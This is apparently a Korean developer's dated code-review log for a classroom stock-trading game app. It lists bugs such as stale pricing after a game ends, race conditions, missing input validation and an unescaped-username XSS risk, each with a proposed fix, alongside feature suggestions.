- **[버그] 게임 종료 후 최종 순위가 새 무작위 주가로 계산됨** (`app.py:48-69`, `app.py:35-46`): `_end_room()`이 `cleanup_room_service(room.id)`로 해당 방의 StockService를 삭제한 후, `GET /api/rooms/<rid>/rankings`나 엑셀 내보내기가 `member_total_value()`를 호출하면 `get_room_service(rid)`가 완전히 새로운 무작위 주가로 초기화된 StockService 인스턴스를 생성함. 결과적으로 **보유 주식 평가액이 게임 종료 시점 주가가 아닌 새 무작위 주가로 계산**되어 최종 순위표와 엑셀 다운로드 결과가 실제 게임 결과와 다를 수 있음. 수정 방법: `app.py:67`의 `cleanup_room_service(room.id)` 호출 직전에 모든 참여자의 `RoomHolding`을 현재 주가로 현금 전환(`m.cash += svc.get_price(h.symbol) * h.shares; h.shares = 0`)하고 `db.session.commit()`하면 종료 이후에도 정확한 자산 집계 가능.

- **복권 결과 진행자 모달에 참여자 이름 미표시** (`app.js:2062-2084`, `app.py:856-878`): `_showLotteryResult()` 호스트 분기의 결과 테이블이 `uid_str`(숫자 문자열)을 행 키로 나열하고 이름 없이 선택 번호와 당첨금만 표시. 교사가 "uid 7번이 3개 일치했다"는 숫자만 보이고 누가 당첨됐는지 알 수 없음. 서버 측 수정: `app.py:870-875`의 `_do_reveal()` 루프에서 `User` 이름을 `results[uid_str]['username']`에 포함. 클라이언트 측 대안: `loadHostMembers()` 응답을 `S.memberNameMap = {uid: username}` 형태로 저장해 두고 (`app.js:383` 직후), 복권 결과 렌더링 시 `S.memberNameMap[uid_str] || uid_str`로 참조하면 서버 변경 없이 해결.

- **퀴즈 창 강제 닫기로 쿨다운/패널티 우회 가능** (`app.py:968-982`, `app.js:810-812`): `closeQuiz()`가 `_quizTimerTick` 인터벌만 초기화하고 서버에 아무 요청을 보내지 않음. `_quiz_state[key]['cooldown_until']`이 0인 채로 유지되므로 학생이 어려운 문제를 보고 닫으면 즉시 다시 `openQuiz()`로 새 문제를 받을 수 있어 패널티 없이 유리한 문제만 선별 가능. `closeQuiz()` 호출 시 `quiz-result`가 아직 표시되지 않은 상태이면 `api.post('/api/rooms/.../quiz', {answer: false})`를 백그라운드에서 호출하거나, 클라이언트 측 `S.quizSkippedUntil = Date.now() + 60_000`을 설정하고 `openQuiz()` 첫 줄에서 잔여 쿨다운을 체크하는 방식으로 방지 (`app.js:812` 수정).

- **진행자가 게임 진행 중 참여자 강퇴 불가** (`app.py:360-367`): `kick_member()` 엔드포인트가 `if room.status != 'waiting': return 400`으로 대기 상태에서만 강퇴를 허용. 실제 수업에서는 게임 시작 후 부정한 방법으로 게임을 방해하거나 집중하지 않는 학생을 중간에 제거해야 하는 경우가 있음. `app.py:362` 조건을 `room.status == 'ended'`으로 변경(종료된 방만 차단)하거나, `active`/`paused` 상태에서는 `RoomMember` 레코드 삭제 대신 `is_active = False` 플래그로 처리하면 진행 중인 게임에서도 강퇴 가능. 강퇴 시 현재 자산을 결과에 포함할지 여부는 진행자가 선택할 수 있게 쿼리 파라미터로 처리 가능.

- **`_lots` 복권 상태 인메모리 저장으로 Render 재시작 시 소실** (`app.py:73`, `app.py:822-939`): `_quiz_state`·`_quiz_settings`·`_rlt_active`와 마찬가지로 `_lots` 딕셔너리도 서버 재시작 시 초기화됨. 복권 `'picking'` 단계(학생 60초 선택 시간)에서 Render dyno가 재시작되면 학생들이 제출한 번호가 전부 소실되고, 게임이 `'paused'` 상태(`auto_paused=True`)로 고착돼 교사가 수동 재개하기 전까지 아무도 거래 불가. 단기 해결책: `Room` 모델에 `lottery_state = db.Column(db.JSON, nullable=True)` 컬럼을 추가하고(`models.py:38` 직후), `_lots` 딕셔너리 변경 시 DB에도 직렬화해 저장하면 재시작 후에도 복권 상태 복원 가능.

---

### 제거/단순화할 것들

- **`join_room()` 동시 입장 시 `UniqueConstraint` → 500 반환** (`app.py:270-272`): 학생이 더블 클릭하거나 네트워크 재시도로 같은 방에 동시에 두 요청을 보내면, 두 요청 모두 `RoomMember.query.filter_by(...)` 조회에서 None을 얻고 두 번째 `db.session.commit()`에서 `UNIQUE constraint failed` → `IntegrityError` → 500 HTML이 반환됨. `api.post()`가 JSON 파싱을 시도해 `SyntaxError`로 이어져 조용히 실패. `db.session.add(m); db.session.commit()` 블록을 `try: ... except IntegrityError: db.session.rollback()` 으로 감싸면 두 번째 요청도 정상 응답 반환 가능 (`app.py:271-272` 수정).

- **`get_room()` 자동 종료가 `paused` 상태를 처리하지 않음** (`app.py:279-281`): `if room.status == 'active' and room.end_time and datetime.utcnow() >= room.end_time:` — 게임이 `'paused'`로 고착된 채 `end_time`을 초과해도 자동 종료가 실행되지 않음. 진행자가 일시정지 후 탭을 닫으면 해당 방이 `ended`가 되지 않아 교사가 새 방을 만들 수도 없는 상태가 됨(`app.py:250` 중복 방 체크에 걸림). `paused` 상태에서는 `end_time - paused_at <= timedelta(0)` 조건(남은 시간이 0 이하)을 추가해 자동 종료하거나, `room.status in ('active', 'paused')` 체크 후 경과 시간을 올바르게 계산해 `_end_room()`을 호출하도록 수정 (`app.py:279` 2줄 수정).

- **`host_members()` 내부 User 레코드 N번 개별 조회** (`app.py:344-346`): 진행자 순위 조회 시 `for m in RoomMember.query...` 루프 내에서 `db.session.get(User, m.user_id)`를 N번 호출. SQLAlchemy identity map 덕에 같은 요청 내 두 번째 조회는 캐시를 사용하지만, 10초 폴링마다 새로운 요청이 들어오면 매번 N번 DB 왕복 발생. `uids = [m.user_id for m in members]; user_map = {u.id: u for u in db.session.query(User).filter(User.id.in_(uids)).all()}` 패턴으로 1번 IN 쿼리로 교체하면 N번 → 1번으로 단축. `lobby_members()` (`app.py:374-378`)와 `host_member_transactions()` (`app.py:409-410`)도 동일 패턴.

- **방치된 `active`/`paused` 방이 교사의 새 방 생성을 영구 차단** (`app.py:250`, `app.py:186-192`): 서버 재시작·비정상 종료 등으로 `status='active'`이지만 실제로 아무도 없는 방이 DB에 남아 있으면, `create_room()` 의 `if Room.query.filter(Room.host_id == user.id, Room.status.in_(...)).first()` 체크에 걸려 교사가 새 방을 만들 수 없음. `end_time + timedelta(hours=2) < datetime.utcnow()` 조건의 방치된 방을 자동 정리하는 로직을 `create_room()` 체크 직전에 추가하거나, 진행자 화면에 "이전 방 강제 종료" 버튼을 노출하면 이 문제를 해소할 수 있음 (`app.py:249` 직전 추가).

- **`RoomTransaction.action` `String(4)` 타입과 복권 당첨 기록에 `'ADJ'` 혼용** (`models.py:71`, `app.py:165`): `action` 컬럼이 `String(4)`로 정의되어 향후 `'BONUS'`·`'FINE'` 등 긴 액션 타입 추가 시 DB truncation 위험. 더불어 복권 당첨금 `_do_reveal()` (`app.py:165`)이 `action='ADJ'`를 사용해 수동 자산 조정과 구분 불가 — `host_member_transactions`에서 복권 당첨과 교사 조정이 같은 "조정" 뱃지로 표시됨. `String(4)` → `String(10)` 확장과 함께 복권 당첨 기록 액션을 `action='LOTTO'`로 변경하면 거래 내역 필터링 및 통계 집계 시 두 유형을 명확히 구분 가능 (`app.py:165`, `app.py:908` 참조).

---

## 2026-06-18 (2차)

### 추가하면 좋을 기능

- **`get_portfolio()` 종료 후 새 StockService 인스턴스로 잘못된 평가액 반환** (`app.py:664`, `stock_service.py:308-311`): 06-18 1차에서 `export_rankings()`의 동일 버그를 지적했으나, `get_portfolio()`도 `get_room_service(rid)`를 호출해 동일한 문제가 발생함. 게임 종료 후 결과 화면에서 참여자가 포트폴리오 탭을 열면 CleanupService 이후 생성된 새 StockService의 무작위 주가로 보유 종목 평가액이 계산되어 결과 화면의 최종 자산과 포트폴리오 상세의 현재 평가액이 불일치함. `_end_room()` 직전에 보유 종목을 현금 전환하는 방식으로 `export_rankings()`와 함께 일괄 해결 가능.

- **`window.onload` 초기화 시 느린 네트워크에서 빈 화면 표시** (`app.js:2138-2158`): `window.addEventListener('load', async () => {...})` 내부에서 `await api.get('/api/auth/me')`를 완료하기 전까지 `showLanding()` 호출 없이 대기함. 학교 인트라넷 환경에서 응답이 2~3초 걸리면 학생이 흰 화면을 보며 앱이 죽었다고 오해할 수 있음. `api.get('/api/auth/me')` 호출 직전에 `showLanding()`을 먼저 호출해 기본 화면을 즉시 표시하고, 세션이 있으면 화면을 교체하는 방식으로 개선하면 체감 로딩 속도 향상.

- **퀴즈 시간 초과 시 자동으로 `answer: false` 제출 — 게임 종료 후에도 동작** (`app.js:781-784`, `app.py:1083-1113`): `_quizTimerTick` 내 `if (_quizTimeSec <= 0) { submitQuiz(null); }`가 게임 종료 이후에도 실행될 수 있음. 퀴즈를 열어 두고 게임이 종료된 후 타이머가 만료되면 `submit_quiz()` 서버에 POST 요청이 전송되고 (게임 종료 후 상태 체크 없어) `RoomMember.cash`가 변경됨. `closeQuiz()`를 `stopPolling()` 또는 `showScreen('screen-results')` 전환 시 함께 호출하면 방지 가능 (`app.js:580-584`에 `closeQuiz()` 한 줄 추가).

- **`create_deposit()` `amount` 음수·NaN·Infinity 미검증** (`app.py:772`): `amount = float((request.json or {}).get('amount', 0))`에서 클라이언트가 `"amount": -1000000` 또는 `"amount": "NaN"`을 보내면 `m.cash < amount` 조건을 통과(`-1000000 < 0` → True면 400, NaN이면 항상 False)하거나 예상치 못한 상태로 예금이 생성될 수 있음. `if not (0 < amount < float('inf')): return jsonify({'error': '금액 오류'}), 400` 한 줄을 `app.py:774` 직후에 추가하면 방어 가능.

- **포트폴리오 탭 섹터별 손익 요약 없음** (`app.js:1325-1435`, `app.py:657-688`): `loadPortfolio()` 응답의 `holdings` 배열을 `sector` 기준으로 그룹화해 섹터별 평가손익 합계를 포트폴리오 탭 상단에 요약 표시하면, 학생이 어떤 섹터에 집중 투자했고 어떤 섹터에서 손실이 발생했는지 즉시 파악 가능. `holdings`를 reduce로 집계하는 약 10줄의 클라이언트 코드만으로 서버 변경 없이 구현 가능하며, 다각화 전략 수업에 활용 효과가 큼.

- **분할 매수 기능 없음** (`app.js:1292-1322`, `index.html:538-541`): 주식 모달의 수량 입력은 정수값만 허용하고 "N주 구매" 방식이지만, 학생이 "50만원어치 매수" 처럼 금액 기준으로 구매하고 싶은 경우 수동 계산이 필요함. `trade-qty` 옆에 금액 입력 모드로 전환하는 "금액으로 매수" 토글 버튼을 추가하고, 입력된 금액을 `Math.floor(amount / S.tradePrice)`로 자동 변환해 수량으로 환산하면 편의성 향상. 서버 API는 변경 없이 클라이언트에서만 20줄 이내로 구현 가능.

---

### 제거/단순화할 것들

- **`_quiz_state`·`_quiz_settings`·`_roulette_config` 게임 종료 후 메모리 무제한 누적** (`app.py:106-130`): `_end_room()` 이 `_lots.pop(room.id, None)`, `_rlt_active.pop(room.id, None)`은 정리하지만 `_quiz_settings.pop(rid, None)`, `_roulette_config.pop(rid, None)`, 그리고 `_quiz_state`의 해당 방 항목(키 `(rid, uid)`)은 그대로 남음. 수업에서 하루에 10개 방을 생성하면 매 방의 참여자 수만큼 `_quiz_state` 항목이 영구 축적됨. `_end_room()` (`app.py:130` 직전)에 세 줄 추가:
  ```python
  _quiz_settings.pop(room.id, None)
  _roulette_config.pop(room.id, None)
  for k in [k for k in _quiz_state if k[0] == room.id]: del _quiz_state[k]
  ```

- **`resume_room()` `room.paused_at` None 미체크 → TypeError 크래시 위험** (`app.py:407`): `paused_duration = now - room.paused_at`에서 `room.paused_at`이 None이면 `TypeError: unsupported operand type(s) for -: 'datetime.datetime' and 'NoneType'`으로 500 오류 반환. `if room.status != 'paused': 400` 체크가 위에 있어 정상 흐름에서는 발생하지 않지만, DB 데이터 불일치(status='paused', paused_at=NULL) 상황에서 크래시 가능. `paused_duration = now - (room.paused_at or now)` 로 방어하거나 `if not room.paused_at: room.paused_at = now` 가드를 추가하면 안전.

- **`get_lottery()` 상태 전이(picking→drawing, drawing→revealed)에 Lock 없음** (`app.py:955-961`): 참여자 30명이 3초마다 동시 폴링하면 `cur['state'] == 'picking'` 체크와 `cur['state'] = 'drawing'` 대입 사이에 다수의 요청이 동시에 진입 가능. 특히 `drawing → revealed` 전이 시 `_do_reveal(rid, cur)`가 중복 호출되어 당첨금이 이중으로 지급될 수 있음. `_lottery_lock`이 `lottery_start()`와 `_auto_start_lottery_if_due()`에는 사용되지만 `get_lottery()` 내 전이 로직에는 없음. `app.py:955` 이후 상태 전이 블록을 `with _lottery_lock:` 으로 감싸면 해결 (`app.py:955-961` 4줄 수정).

- **`_do_reveal()` deprecated `Room.query.get(rid)` 사용** (`app.py:174`): `room = Room.query.get(rid)` 패턴이 SQLAlchemy 2.x에서 폐기됨. 06-10에 전체 교체를 권장했으나 이 함수는 누락. `db.session.get(Room, rid)`로 교체 + `if not room: return` None 가드 추가 필요.

- **`get_room()` `paused` 상태 자동 종료 미처리** (`app.py:362-364`): `if room.status == 'active' and room.end_time and datetime.utcnow() >= room.end_time:` 조건이 `paused` 상태를 제외해, 룰렛·복권으로 게임이 paused된 채 end_time이 지나면 자동 종료가 실행되지 않음. 교사가 탭을 닫으면 해당 방이 영구 paused 상태로 고착돼 새 방 생성 불가 (`app.py:310` 체크에 걸림). `room.status == 'active'` → `room.status in ('active', 'paused')` 로 확장하고 `paused` 상태의 남은 시간은 `end_time - paused_at`으로 계산해 종료 판단.

- **`loadParticipantRankings()` 및 `loadResults()` `e.username` XSS 미처리** (`app.js:1549`, `app.js:1614`): `${e.username}`이 innerHTML에 직접 삽입됨. `escHtml()` 함수가 `app.js:815`에 정의되어 있으므로 `${escHtml(e.username)}`으로 교체만 하면 즉시 방지 가능. `app.js` 전체에서 `innerHTML`에 `e.username`, `u.username` 등 사용자 입력이 포함된 변수가 사용되는 곳 일괄 점검 필요 (`host_members` 렌더링, 거래 내역 `t.note` 포함).

---

## 2026-06-18 (3차)

### 추가하면 좋을 기능

- **게임 종료 시 퀴즈·룰렛 오버레이 자동 닫기 없음** (`app.js:579-584`): `stopPolling()` → `showScreen('screen-results')` 전환 시 `quiz-overlay`와 `roulette-overlay`가 `position:fixed`로 결과 화면 위에 계속 떠 있을 수 있음. `app.js:580-583`의 `stopPolling(); stopTimer();` 직후에 `document.getElementById('quiz-overlay').style.display = 'none'; document.getElementById('roulette-overlay').style.display = 'none';` 두 줄을 추가하면 게임 종료 시 깔끔하게 닫힘. 복권 오버레이(`lottery-overlay`)도 동일 처리 필요.

- **진행자 게임 시간 연장 버튼** (`app.py:399-413`, `index.html:170-173`): 현재 `resume_room()` API는 있지만 수동 시간 연장은 없음. 수업이 늦게 시작되거나 마무리 토론이 필요할 때 교사가 원하는 분 수만큼 연장할 수 있는 `POST /api/rooms/<rid>/extend` 엔드포인트와 진행자 화면의 "+5분" 버튼 추가. `room.end_time += timedelta(minutes=ext_min)` 한 줄 + `db.session.commit()`으로 구현 완료. 현재 `pause`·`resume` 패턴을 재사용하므로 서버 10줄, 클라이언트 5줄 이내로 완성 가능.

- **게임 마지막 10초 카운트다운 알림** (`app.js:710-713`): `startTimer()` 의 `tick()` 내에서 `rem === 10`이 처음 감지될 때 `for (let i = 10; i >= 1; i--) setTimeout(() => toast(\`⏰ ${i}초!\`, 'warn'), (10 - i) * 1000)` 패턴으로 카운트다운 토스트를 예약하면 학생이 종료 직전임을 인식하고 마지막 거래를 서두를 수 있음. `navigator.vibrate?.([100])` 매초 진동을 추가하면 화면을 보지 않는 학생에게도 알림 전달. `app.js:712` 한 줄 추가로 구현 완료.

- **포트폴리오 다각화 지수 표시** (`app.js:1325-1435`, `app.py:657-688`): `loadPortfolio()` 응답의 `holdings` 배열에서 고유 섹터 수와 종목 수를 카운트해 "분산도: 3개 섹터 / 5개 종목" 형태의 간단한 지표를 포트폴리오 탭 상단 요약 카드에 추가. 특정 종목·섹터에 전액 집중한 학생에게는 "⚠️ 집중투자" 경고 뱃지를 표시하면 분산투자 개념 교육 효과. 서버 변경 없이 클라이언트 5줄로 구현 가능.

- **진행자 `host_adjust` 전체 학생 일괄 지급/차감** (`app.py:472-488`, `index.html:500-520`): 현재 단일 참여자에게만 적용 가능. `user_id` 필드를 `'all'`로 허용하고, `for m in RoomMember.query.filter_by(room_id=rid)` 루프로 전체 일괄 처리하면 이벤트 보상·벌금을 30명에게 한 번에 적용 가능. 06-12에 처음 제안됐으나 미구현. `app.py:479-488` 내에 `if target_uid == 'all':` 분기를 추가하는 것으로 50줄 내 완성.

- **룰렛 오버레이 `position:fixed` 결과 화면에서 클릭 차단** (`app.js:595-598`, `app.js:579-584`): `S.rouletteOpened = true`로 설정 후 `openRouletteModal()` 호출 시 학생이 즉시 `✕`로 닫으면 `_rltSpinning = false` 상태로 오버레이만 닫히고 `S.rouletteOpened` 플래그는 `true`로 유지됨. 이후 게임이 종료돼 결과 화면으로 이동해도 `roulette-overlay`가 `display:none`이 아니면 결과 화면 전체 클릭이 차단될 수 있음. `closeRoulette()` 내에서 `S.rouletteOpened = false`로 리셋하거나, `stopPolling()` 시 오버레이를 강제 닫는 처리 추가.

---

### 제거/단순화할 것들

- **`_show_lot_participant_picker()` 매 3초 45개 버튼 DOM 재생성** (`app.js:1995-2017`): `picking` 상태 60초 동안 3초 폴링으로 최대 20회 `_renderLotGrid('lottery-picker-grid', ...)` 호출 → 매번 45개 버튼 DOM을 삭제 후 재생성. `overlay.style.display === 'flex'`이고 picker-section이 이미 보이는 상태이면 `_lotCountdown()` 갱신만 하고 조기 반환하는 가드가 `app.js:1997-1999`에 있지만, `d.my_picks` 변경 여부 비교 없이 항상 `_lotParticipantPicks = d.my_picks || []`로 재할당 후 `_renderLotGrid` 호출 (`app.js:2001-2009`). 이미 제출한 경우(`_lotPickerSubmitted === true`)이면 그리드 재렌더 없이 카운트다운만 갱신하도록 `if (_lotPickerSubmitted) { _lotCountdown(...); return; }` 가드를 `app.js:2001` 직전에 추가.

- **`RLT_SEGS` 완전한 dead code** (`app.js:820-826`): 7줄의 상수 선언이 코드 어디서도 참조되지 않음. 06-14 (4차), 06-16, 06-16 (3차)에 걸쳐 반복 지적됐으나 미수정. `const RLT_SEGS = [...]` 7줄 삭제만으로 해결.

- **`openRules()` 탭 상태 미초기화** (`app.js:2128`): `openModal('modal-rules')`만 호출하고 탭 초기화 없어 이전에 열었던 탭이 그대로 남음. `openRules()`에 `document.querySelector('.rules-tab')?.click()` 한 줄 추가. 06-15 (2차)에 지적됐으나 미수정.

- **`startNewsPolling()` interval 8초 고정** (`app.js:736`): 현재 8000ms로 설정되어 있음(이전 3000ms에서 개선됨). 하지만 진행자가 `news_seconds`를 300초로 설정해도 클라이언트는 8초마다 폴링을 계속함. 서버 `get_room()` 최초 응답에 `news_interval_seconds` 필드를 포함시키고, `startNewsPolling()` 호출 시 `S.room.news_interval_seconds || 8`을 인터벌로 사용하면 진행자 설정과 동기화. 폴링 주기를 줄이면 불필요한 요청이 크게 감소.

- **`execTrade()` 성공 후 `ms-holding` 로컬 갱신이 `refreshMyRank()` 재호출과 경쟁 조건** (`app.js:1313-1321`): 거래 성공 시 `S.tradeHolding`을 로컬로 증감(`app.js:1313-1318`)하고 `ms-holding`을 갱신한 뒤 `refreshMyRank()`를 호출. `refreshMyRank()`는 rankings API를 호출하는데 이 응답에는 `holdings`가 없으므로 `ms-holding`을 갱신하지 않음. 그러나 `openStockModal()`을 다시 열면 portfolio API로 실제 보유 수량을 가져와 덮어씌워 결과적으로 올바른 값이 표시됨. 로컬 갱신(`S.tradeHolding`)이 연속 거래 시 누적 오차를 일으킬 수 있으므로 `execTrade()` 성공 시 로컬 갱신 대신 portfolio API를 재호출해 정확한 값으로 동기화하는 것이 더 안전.

- **`loadResults()` 매 호출마다 `renderResultsChart()` 재생성** (`app.js:1624`): `resultsBarChart`가 이미 존재하더라도 `renderResultsChart(data)`가 `S.resultsBarChart?.destroy()`를 호출하고 새로 생성. 결과 화면은 정적이므로 `if (S.resultsBarChart) return;` 가드를 추가해 최초 1회만 렌더링하면 불필요한 Chart.js 재초기화를 방지.

---

## 2026-06-18 (4차)

### 추가하면 좋을 기능

- **게임 종료 후 룰렛 미완료 학생 자동 완료 타임아웃** (`app.py:111`, `app.py:1313-1321`): 학생이 게임 종료 후 앱을 닫거나 브라우저를 새로고침하면 `openPostGameRoulette()`가 실행되지 않아 `minigame/done`이 영원히 호출되지 않음. 진행자는 `rlt_pending > 0`으로 결과를 발표할 수 없게 됨. `_end_room()` 내에서 `threading.Timer(300, lambda: _auto_complete_rlt(room.id)).start()`로 5분 타임아웃을 등록하고, `_auto_complete_rlt()`는 `_rlt_completed[rid]`에 미완료 참가자를 일괄 추가하도록 구현. `minigame_done()` 호출 시 타이머를 취소하는 `_rlt_timers: dict` 딕셔너리도 함께 관리 권장 (`app.py:151` 직후 `_rlt_timers = {}`).

- **결과 대기 화면에서 룰렛 완료 현황 표시** (`app.js:779-789`, `index.html:634-641`): 참가자가 `screen-waiting-results`에서 "⏳ 결과 발표 대기 중" 문구만 보며 기다림. `startWaitingPoll()` 내 3초 폴링 응답의 `r.rlt_pending` 값을 활용해 `rlt_pending > 0`이면 "🎰 X명이 룰렛을 진행 중입니다 (곧 결과가 발표됩니다)" 텍스트를 동적으로 갱신하면 학생들이 대기 이유를 이해할 수 있음. `r.rlt_pending`은 이미 `room_dict()` 응답에 포함되어 있으므로 클라이언트 5줄 추가만으로 구현 완료 (`app.js:783` 참조).

- **진행자 강제 결과 발표 옵션** (`app.py:1324-1338`): 학생이 앱을 닫아 룰렛 완료가 불가능할 경우 교사가 결과를 영원히 발표할 수 없는 문제 발생. `POST /api/rooms/<rid>/host/publish-results` 요청 바디에 `{"force": true}` 파라미터를 추가하고, `app.py:1334`의 `if pending:` 블록 앞에 `force = (request.json or {}).get('force', False); if not force and pending: return 400` 형태로 강제 발표를 허용. 프론트엔드에서도 "강제 발표(confirm 후 실행)" 버튼을 `results-publish-wrap`에 추가하면 수업 마무리 시간 부족 시 탈출구 확보 가능.

- **퀴즈 오답 패널티 청산 종목 상세 토스트 알림** (`app.js:879-907`, `app.py:1230-1266`): `f2044c9` 커밋에서 퀴즈 오답 시 주식·예금까지 강제 청산하는 기능이 추가됐으나, 학생 입장에서는 `toast('❌ 오답! -N원 패널티', 'error')` 외에 어떤 종목이 청산됐는지 알 수 없음. `app.py:1269` 리턴 전에 `liquidated: [{name, shares, amount}]` 배열을 응답에 포함시키고, 클라이언트에서 청산 종목이 있으면 `"⚠ 삼성전자 10주 강제 매도됨"` 토스트를 각 항목별로 표시하면 학생이 패널티의 실체를 즉각 인식해 투자 교육 효과 향상.

- **`ending_soon` 배너에서 남은 시간 실시간 카운트다운** (`app.js:667-680`): `showEndingSoonBanner()`가 "⚡ 1분 후 게임이 종료됩니다!" 고정 텍스트만 표시. 1분 카운트다운이 시작될 때 `S.room.remaining_seconds`가 이미 응답에 포함되므로, 배너 생성 시 `let cnt = S.room.remaining_seconds || 60; const cntId = setInterval(() => { if (--cnt <= 0) clearInterval(cntId); banner.textContent = '⚡ 게임 종료까지 ' + cnt + '초!'; }, 1000)` 패턴으로 초 단위 카운트다운을 표시하면 학생의 긴박감 유도. 배너 삭제 시 `clearInterval(cntId)` 정리 필요 (`app.js:662` 참조).

- **룰렛 베팅 퀵버튼 (총자산 비율 선택)** (`index.html:561`, `app.js:1127`): 룰렛 베팅 입력창(`rlt-bet-input`)에 숫자를 직접 입력해야 함. `_rltCash` 변수가 이미 총자산 기준 값으로 설정되어 있으므로, 입력창 옆에 "10%" / "25%" / "50%" / "전액" 퀵버튼 4개를 추가하고 클릭 시 `document.getElementById('rlt-bet-input').value = Math.floor(_rltCash * pct)` 로 채우면 편의성 향상. 서버 변경 없이 HTML 4줄 + JS 4줄로 구현 완료.

- **게임 종료 직전 보유 종목 스냅샷 저장** (`app.py:134-141`, `models.py:25-38`): `_end_room()`에서 모든 `RoomHolding`을 현금 전환 후 `db.session.delete(h)`로 삭제함. 게임 종료 후 결과 화면·엑셀에서 "학생이 마지막으로 보유했던 종목 목록"을 볼 수 없어 수업 후 투자 전략 분석이 불가능. `Room` 모델에 `final_holdings_json = db.Column(db.Text, nullable=True)` 컬럼을 추가하고, `db.session.delete(h)` 직전에 보유 종목 목록을 JSON 직렬화해 저장하면 종료 후에도 종목별 매수 평균·보유량 복원 가능. 엑셀 내보내기 두 번째 시트 구현(`app.py:1386` 이후 `wb.create_sheet()`)에도 활용 가능.

---

### 제거/단순화할 것들

- **`openPostGameRoulette()` `spins_left <= 0` early return 전 `minigame/done` 미호출 → 결과 발표 영구 차단** (`app.js:1115-1121`): `data.spins_left <= 0` 또는 `data.error` 조건으로 early return 시 `api.post('.../minigame/done', {})`를 호출하지 않아 해당 학생이 `_rlt_completed`에 추가되지 않음. `host_publish_results()`가 `rlt_pending > 0`을 반환해 결과 발표가 영원히 차단됨. 스핀을 3번 모두 소진한 학생이 1명이라도 있으면 즉시 재현 가능. `app.js:1116` early return 직전에 `await api.post(\`/api/rooms/\${S.room.id}/minigame/done\`, {}).catch(()=>{})` 1줄 추가만으로 해결.

- **`_rlt_completed`·`_results_published` 인메모리 → 서버 재시작 시 결과 발표 영구 차단** (`app.py:79-81`, `app.py:1331-1335`): Render 재시작 후 `_rlt_completed[rid]`가 없어 `rlt_pending`이 전체 참가자 수로 반환되고, 진행자는 결과를 발표할 수 없게 됨. `Room` 모델에 `results_published = db.Column(db.Boolean, default=False)` 컬럼 + `RoomMember`에 `rlt_done = db.Column(db.Boolean, default=False)` 컬럼 추가로 DB에 영속화하면 재시작 후 복원 가능. `_end_room()` 내 `_results_published[room.id] = False`(`app.py:149`)는 `room.results_published = False`로 이전하고, `_rlt_completed` 인메모리 관련 코드를 DB 조회로 교체하면 일관성 확보.

- **`minigame_spin()` · `submit_quiz()` 주식 완전 청산 후 `RoomHolding` 레코드 미삭제** (`app.py:979`, `app.py:1246`): 두 함수 모두 `h.shares = 0; h.avg_price = 0`만 수행하고 `db.session.delete(h)`를 호출하지 않음. `trade()` 엔드포인트(`app.py:709`)는 `if holding.shares == 0: db.session.delete(holding)`으로 올바르게 처리하는 것과 불일치. 0주 레코드가 누적되면 `RoomHolding.query.filter_by()` 반환 크기가 비대해지고, 이후 `get_portfolio()`·청산 루프의 `h.shares <= 0: continue` 스킵이 증가. `h.shares = 0; h.avg_price = 0` 두 줄 대신 `db.session.delete(h)` 단일 호출로 교체 권장.

- **`closeRoulette()` `_rltSpinning = true` 중 호출 시 `S._postGameRoulette` 조기 리셋** (`app.js:1093`): 스핀 애니메이션(`await new Promise(r => setTimeout(r, 4300))`) 중 오버레이가 닫히면 `S._postGameRoulette = false`로 리셋됨. 4.3초 후 `doRouletteSpin()` 완료 시 `if (S._postGameRoulette)` 블록이 실행되지 않아 `minigame/done` 미호출 → 결과 발표 차단. 2026-06-14 4차·2026-06-15 2차에 반복 지적됐으나 여전히 미수정. `closeRoulette()` 첫 줄에 `if (_rltSpinning) return;` 1줄 추가만으로 해결.

- **`minigame_spin()` `bet` NaN 미검증 → `RoomMember.cash = NaN` 부패 위험** (`app.py:955-963`): `if bet <= 0 or bet > total_assets:` 검증에서 `float('nan') <= 0` → False, `float('nan') > total_assets` → False이므로 NaN bet이 검증을 통과. `shortfall = bet - m.cash` → NaN → 주식 청산 루프 미진입 → `m.cash = m.cash - bet + winnings` → NaN. `create_deposit()`에는 `if not (0 < amount < float('inf'))` 방어 코드가 있으나(`app.py:836`) `minigame_spin()`에는 누락. `app.py:963` 직전에 `import math; if not math.isfinite(bet): return jsonify({'error': '금액 오류'}), 400` 추가 필요.

- **`end_room()` `paused` 상태에서 1분 카운트다운 없이 즉시 종료 — 복권 미지급 위험** (`app.py:474-483`): `if room.status == 'active' and ... rid not in _ending_soon:` 조건이 `active`만 처리해, `paused` 상태에서 교사가 종료를 누르면 즉시 `_end_room()`이 호출됨. `_lots.pop(room.id, None)`으로 진행 중인 복권의 `_do_reveal()` 완료 전에 상태가 삭제돼 당첨금이 지급되지 않을 수 있음. `paused` 상태에서도 `room.status = 'active'; _ending_soon.add(rid); room.end_time = now + timedelta(seconds=60)` 처리를 추가하거나, `_lots.get(rid, {}).get('current', {}).get('state') in ('picking', 'drawing')`이면 진행 중임을 알리는 경고를 반환 권장.

- **`minigame_close()` deprecated `Room.query.get(rid)` + None 체크 누락** (`app.py:923`): `_rlt_lock` 블록 내에서 `Room.query.get(rid)` (SQLAlchemy 2.x 폐기 API)를 사용. `room`이 None이면 `room.status`, `room.paused_at` 접근 시 `AttributeError`로 500 반환. 다른 라우트가 `db.session.get(Room, rid)` 패턴을 사용하는 것과 불일치. `db.session.get(Room, rid)` + `if not room: return jsonify({'ok': True})` 명시적 None 가드로 교체하면 안전성·일관성 동시 확보.

---

## 2026-06-19

### 추가하면 좋을 기능

- **`waiting` 상태로 방치된 대기 방 자동 정리 없음** (`app.py:336-345`): `create_room()`의 stale 방 정리가 `status.in_(['active', 'paused'])` AND `end_time < stale_cutoff`인 경우만 처리(`app.py:338-344`). `waiting` 상태로 방치된 방(예: 24시간 이상 시작하지 않은 방)은 정리되지 않아 교사가 새 방을 만들 수 없는 상황이 발생. `stale_cutoff_long = datetime.utcnow() - timedelta(hours=24)` 기준으로 `Room.status == 'waiting'` AND `Room.created_at < stale_cutoff_long` 조건의 정리 분기를 `app.py:337` 이후에 추가하면 해결.

